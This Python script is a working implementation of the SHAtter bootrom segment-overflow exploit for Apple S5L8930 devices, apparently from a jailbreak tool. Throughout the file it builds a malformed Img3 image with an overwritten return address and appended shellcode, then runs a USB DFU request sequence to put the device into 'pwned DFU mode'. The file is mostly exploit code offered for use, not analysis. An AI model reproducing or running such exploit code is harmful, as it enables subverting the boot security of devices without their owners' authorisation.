import struct, sys, time
import dfu

SRTG_STRING = 'SRTG:[iBoot-574.4]'
CPID_STRING = 'CPID:8930'

def generate_payload():
    shellcode_address = 0x8402F1D8
    data = '\xF0' * 92 + struct.pack('<I', shellcode_address)

    dataTag = struct.pack('<4s2I', 'DATA'[::-1], 12 + len(data), len(data)) + data
    shshTag = struct.pack('<4s2I', 'SHSH'[::-1], 12, 0)
    certTag = struct.pack('<4s2I', 'CERT'[::-1], 12, 0)

    img3Payload = dataTag + shshTag + certTag
    img3Header = struct.pack('<4s3I4s', 'Img3'[::-1], 20 + len(img3Payload), len(img3Payload), len(dataTag), 'ibss'[::-1])

    f = open('bin/SHAtter-shellcode.bin', 'rb')
    shellcode = f.read()
    f.close()
    return img3Header + img3Payload + shellcode

def exploit():
    print '*** based on SHAtter exploit (segment overflow) by posixninja and pod2g ***'

    device = dfu.acquire_device()
    print 'Found:', device.serial_number

    if 'PWND:[' in device.serial_number:
        print 'Device is already in pwned DFU Mode. Not executing exploit.'
        return

    if CPID_STRING not in device.serial_number:
        print 'ERROR: Not a compatible device. This exploit is for S5L8930 devices only. Exiting.'
        sys.exit(1)

    if SRTG_STRING not in device.serial_number:
        print 'ERROR: CPID is compatible, but serial number string does not match.'
        print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
        sys.exit(1)

    dfu.reset_counters(device)
    dfu.get_data(device, 0x40)
    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    dfu.request_image_validation(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    dfu.get_data(device, 0x2C000)
    dfu.release_device(device)

    time.sleep(0.5)

    device = dfu.acquire_device()
    dfu.reset_counters(device)
    dfu.get_data(device, 0x140)
    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    dfu.request_image_validation(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    dfu.send_data(device, generate_payload())
    dfu.get_data(device, 0x2C000)
    dfu.release_device(device)

    time.sleep(0.5)

    device = dfu.acquire_device()
    failed = 'PWND:[SHAtter]' not in device.serial_number
    dfu.release_device(device)

    if failed:
        print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
        sys.exit(1)

    print 'Device is now in pwned DFU Mode.'
